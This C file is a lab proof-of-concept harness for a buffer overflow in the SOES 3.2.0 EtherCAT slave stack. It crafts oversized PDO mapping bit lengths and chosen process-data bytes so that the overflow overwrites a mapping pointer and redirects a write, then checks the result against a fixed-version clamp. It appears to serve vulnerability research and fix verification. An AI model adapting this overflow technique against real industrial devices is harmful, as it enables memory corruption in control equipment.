/* SOES 3.2.0 PDO-mapping size overflow harness (CVE-2026-129811).
 *
 * Drives the REAL pinned code:
 *   - sizeOfPDO()          (soes/esc_coe.c) computes the process-data byte size
 *                          from master-writable PDO mapping bit lengths, with
 *                          NO clamp to MAX_RXPDO_SIZE in 3.2.0;
 *   - RXPDO_update()       (soes/ecat_slv.c, included below so rxpdo[]/SMmap2[]
 *                          are the REAL static globals in the pinned layout);
 *   - COE_pdoUnpack()      (soes/esc_coe.c) dereferences the overwritten pointer.
 *
 * ESC_read() is stubbed: its bytes stand in for master-controlled EtherCAT
 * process data. No network, no HAL, no dereference of any real target pointer.
 * This is a lab demonstration of the primitive, not a wire trigger or rung 5.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* Pull in the pinned 3.2.0 file so rxpdo/txpdo/SMmap2/SMmap3/ESCvar are the
 * actual globals at their actual in-object offsets, not a re-creation. */
#include "ecat_slv.c"

/* ---- minimal object dictionary (sorted; 0xFFFF terminator) ----
 * 0x1c12 sub0=1 maps object 0x2000;
 * 0x2000 has two subentries whose low byte (bit length) is 255 each,
 * so sizeOfPDO sums 510 bits -> BITS2BYTES = 64 bytes for a 42-byte buffer. */
static const _objd od_1c12[] = {
   { .subindex = 0, .value = 1 },
   { .subindex = 1, .value = 0x2000 },
};
static const _objd od_2000[] = {
   { .subindex = 0, .value = 2 },
   { .subindex = 1, .value = (0x2001u << 16) | (1u << 8) | 255u },
   { .subindex = 2, .value = (0x2001u << 16) | (1u << 8) | 255u },
};
static const _objd od_2001[] = {
   { .subindex = 0, .value = 1 },
   { .subindex = 1, .value = 8 },   /* bit length 8, benign */
};
const _objectlist SDOobjects[] = {
   { .index = 0x1c12, .maxsub = 1, .objdesc = od_1c12 },
   { .index = 0x2000, .maxsub = 2, .objdesc = od_2000 },
   { .index = 0x2001, .maxsub = 1, .objdesc = od_2001 },
   { .index = 0xFFFF, .maxsub = 0, .objdesc = NULL },
};

/* Stubs for ecat_slv.c externs unused by RXPDO_update. */
void ESC_write(uint16_t a, void *b, uint16_t l) { (void)a;(void)b;(void)l; }
void FOE_init(void) {}
void EOE_init(void) {}

/* Chosen process data. Bytes 56..63 land on SMmap2[0].obj. */
static uint8_t g_process[128];
static _objd g_fake_obj;
static uint8_t g_target[32];

/* Stand-in for master process data read into rxpdo by RXPDO_update. */
void ESC_read(uint16_t address, void *buf, uint16_t len)
{
   (void)address;
   if (len > sizeof(g_process)) len = sizeof(g_process);
   memcpy(buf, g_process, len);
}

static void reset(void)
{
   memset(g_process, 0x5a, sizeof(g_process));
   memset(g_target, 0, sizeof(g_target));
   memset(&g_fake_obj, 0, sizeof(g_fake_obj));
   g_fake_obj.bitlength = 128;          /* > 64: COE_pdoUnpack uses memcpy */
   g_fake_obj.data = g_target;
   memset(SMmap2, 0, sizeof(SMmap2));
   memset(rxpdo, 0, sizeof(rxpdo));
   ESCvar.rxpdo_override = NULL;
   ESCvar.sm2mappings = 2;
}

int main(int argc, char **argv)
{
   int clamp = (argc > 1 && strcmp(argv[1], "fixed") == 0);
   int nmappings = 0;
   uint16_t size;

   reset();

   /* Real size computation from master-writable mapping bit lengths. */
#ifdef SOES_FIXED_VERSION
   /* Real 3.2.1 signature: fix adds max_bytes and rejects oversize. */
   size = sizeOfPDO(RX_PDO_OBJIDX, &nmappings, SMmap2, MAX_MAPPINGS_SM2,
                    MAX_RXPDO_SIZE);
#else
   size = sizeOfPDO(RX_PDO_OBJIDX, &nmappings, SMmap2, MAX_MAPPINGS_SM2);
#endif
   printf("sizeOfPDO=%u nmappings=%d MAX_RXPDO_SIZE=%d\n",
          (unsigned)size, nmappings, (int)MAX_RXPDO_SIZE);

   uint16_t used = size;
   if (clamp)
   {
      /* 3.2.1 fix: reject when the computed size exceeds the real buffer. */
      if (used > MAX_RXPDO_SIZE) used = 0;
   }
   ESCvar.ESC_SM2_sml = used;
   printf("ESC_SM2_sml=%u\n", (unsigned)used);

   const _objd *orig_obj = SMmap2[0].obj;
   printf("before: SMmap2[0].obj=%p target0=%02x\n",
          (void *)orig_obj, g_target[0]);

   {
      uintptr_t a = (uintptr_t)&g_fake_obj;
      int k;
      for (k = 0; k < 8; k++) g_process[56 + k] = (uint8_t)(a >> (8 * k));
   }
   /* Fill the first 16 process bytes with a recognisable written marker. */
   memset(g_process, 0x4d, 16);

   /* Real process-data read (overflow) + real pointer dereference. */
   if (used) RXPDO_update();

   printf("after:  SMmap2[0].obj=%p target0=%02x target_last=%02x\n",
          (void *)SMmap2[0].obj, g_target[0], g_target[15]);
   printf("verdict: ptr_overwrite=%d chosen_write=%d\n",
          SMmap2[0].obj == &g_fake_obj,
          g_target[0] == 0x4d && g_target[15] == 0x4d);
   return 0;
}
